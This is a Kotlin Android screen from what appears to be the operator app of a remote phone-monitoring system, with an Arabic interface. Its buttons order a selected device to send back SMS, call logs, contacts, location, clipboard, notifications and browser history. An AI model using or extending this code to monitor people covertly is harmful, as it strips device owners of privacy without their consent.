package com.abuzahra.admin.ui.data

import android.os.Bundle
import android.util.Log
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.abuzahra.admin.R
import com.abuzahra.admin.data.api.SendCommandRequest
import com.abuzahra.admin.databinding.ActivityDataBinding
import com.abuzahra.admin.util.Preferences
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import kotlinx.coroutines.launch
import java.net.SocketTimeoutException
import java.net.UnknownHostException

class DataActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "DataActivity"
    }

    private lateinit var binding: ActivityDataBinding
    private var selectedDeviceId: String = ""
    private var selectedDeviceName: String = ""

    // Debug log
    private lateinit var debugLogText: TextView
    private lateinit var debugLogScroll: ScrollView
    private val debugLogs = mutableListOf<String>()

    private fun addLog(msg: String) {
        val timestamp = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US)
            .format(java.util.Date())
        val entry = "[$timestamp] $msg"
        Log.d(TAG, entry)
        debugLogs.add(0, entry)
        if (debugLogs.size > 30) {
            val excess = debugLogs.subList(30, debugLogs.size)
            excess.clear()
        }
        val sb = StringBuilder()
        for (log in debugLogs) sb.append(log).append("\n")
        debugLogText.text = sb.toString()
        debugLogScroll.post { debugLogScroll.scrollTo(0, 0) }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityDataBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setupDebugLog()
        setupToolbar()
        loadDataButtons()
    }

    private fun setupDebugLog() {
        val rootLayout = binding.root as? LinearLayout ?: return
        debugLogScroll = ScrollView(this).apply {
            isVerticalScrollBarEnabled = true
            setBackgroundColor(ContextCompat.getColor(this@DataActivity, R.color.surface))
            setPadding(16, 8, 16, 8)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                200
            )
        }
        debugLogText = TextView(this).apply {
            textSize = 11f
            typeface = android.graphics.Typeface.MONOSPACE
            setTextColor(ContextCompat.getColor(this@DataActivity, R.color.text_primary))
        }
        debugLogScroll.addView(debugLogText)
        rootLayout.addView(debugLogScroll)
        addLog("الخادم: ${Preferences.getInstance(this).serverUrl}")
    }

    private fun setupToolbar() {
        setSupportActionBar(binding.toolbar)
        supportActionBar?.title = "البيانات"
        supportActionBar?.setDisplayHomeAsUpEnabled(true)
        binding.toolbar.setNavigationOnClickListener { finish() }
    }

    private fun loadDataButtons() {
        // ⚠️ Keys MUST match server COMMAND_REGISTRY exactly!
        val dataButtons = listOf(
            Triple(binding.btnSms, "sms", "الرسائل القصيرة"),
            Triple(binding.btnCalls, "calls", "سجل المكالمات"),
            Triple(binding.btnContacts, "contacts", "جهات الاتصال"),
            Triple(binding.btnLocation, "location", "الموقع الحالي"),
            Triple(binding.btnNotifications, "notifications", "الإشعارات"),
            Triple(binding.btnClipboard, "clipboard", "الحافظة"),
            Triple(binding.btnBattery, "battery", "البطارية"),
            Triple(binding.btnDeviceInfo, "info", "معلومات الجهاز"),
            Triple(binding.btnWifi, "wifi_info", "شبكات Wi-Fi"),
            Triple(binding.btnApps, "installed_apps", "التطبيقات المثبتة"),
            Triple(binding.btnBrowser, "browser_history", "سجل المتصفح"),
            Triple(binding.btnCalendar, "calendar", "التقويم")
        )

        // Load devices to select
        lifecycleScope.launch {
            try {
                val api = Preferences.getInstance(this@DataActivity).getApiService()
                val devices = api.getDevices()
                addLog("✅ تم تحميل ${devices.size} جهاز")
                if (devices.isNotEmpty()) {
                    val firstOnline = devices.firstOrNull { it.isOnline } ?: devices.first()
                    selectedDeviceId = firstOnline.id
                    selectedDeviceName = firstOnline.name.ifEmpty { firstOnline.model }
                    binding.tvSelectedDevice.text = "الجهاز: $selectedDeviceName"
                    addLog("الجهاز المحدد: $selectedDeviceName (${if (firstOnline.isOnline) "متصل" else "غير متصل"})")

                    binding.tvSelectedDevice.setOnClickListener {
                        val names = devices.map { it.name.ifEmpty { it.model } }
                        MaterialAlertDialogBuilder(this@DataActivity)
                            .setTitle("اختر جهازاً")
                            .setItems(names.toTypedArray()) { _, which ->
                                selectedDeviceId = devices[which].id
                                selectedDeviceName = names[which]
                                binding.tvSelectedDevice.text = "الجهاز: $selectedDeviceName"
                                addLog("تم تغيير الجهاز: $selectedDeviceName")
                            }
                            .show()
                    }
                } else {
                    binding.tvSelectedDevice.text = "لا توجد أجهزة متصلة"
                    addLog("⚠️ لا توجد أجهزة")
                }
            } catch (e: Exception) {
                addLog("❌ فشل تحميل الأجهزة: ${e.message}")
            }
        }

        dataButtons.forEach { (button, command, name) ->
            button.setOnClickListener {
                if (selectedDeviceId.isBlank()) {
                    addLog("❌ لا يوجد جهاز محدد")
                    MaterialAlertDialogBuilder(this)
                        .setTitle("خطأ")
                        .setMessage("لا يوجد جهاز محدد")
                        .setPositiveButton("حسناً", null)
                        .show()
                    return@setOnClickListener
                }
                sendDataCommand(command, name)
            }
        }
    }

    private fun sendDataCommand(command: String, name: String) {
        lifecycleScope.launch {
            addLog("📦 إرسال: [$command] ($name) → الجهاز: $selectedDeviceId")
            try {
                val api = Preferences.getInstance(this@DataActivity).getApiService()
                val response = api.sendCommand(selectedDeviceId, SendCommandRequest(command))
                if (response.ok) {
                    addLog("✅ تم إرسال [$command] بنجاح")
                } else {
                    addLog("❌ فشل [$command]: ${response.message}")
                }
                MaterialAlertDialogBuilder(this@DataActivity)
                    .setTitle(name)
                    .setMessage(
                        if (response.ok) "✅ تم إرسال الطلب بنجاح. سيتم تحديث البيانات قريباً.\n\nالأمر: $command"
                        else "❌ فشل: ${response.message}\n\nالأمر: $command"
                    )
                    .setPositiveButton("حسناً", null)
                    .show()
            } catch (e: SocketTimeoutException) {
                addLog("❌ مهلة الاتصال")
                showError("انتهت مهلة الاتصال بالخادم")
            } catch (e: UnknownHostException) {
                addLog("❌ لا يمكن الوصول للخادم")
                showError("لا يمكن الوصول إلى الخادم")
            } catch (e: retrofit2.HttpException) {
                addLog("❌ خطأ HTTP ${e.code()}: ${e.message}")
                showError("خطأ الخادم: HTTP ${e.code()}")
            } catch (e: Exception) {
                addLog("❌ خطأ: ${e.javaClass.simpleName}: ${e.message}")
                showError("خطأ: ${e.message}")
            }
        }
    }

    private fun showError(msg: String) {
        MaterialAlertDialogBuilder(this)
            .setTitle("خطأ")
            .setMessage(msg)
            .setPositiveButton("حسناً", null)
            .show()
    }
}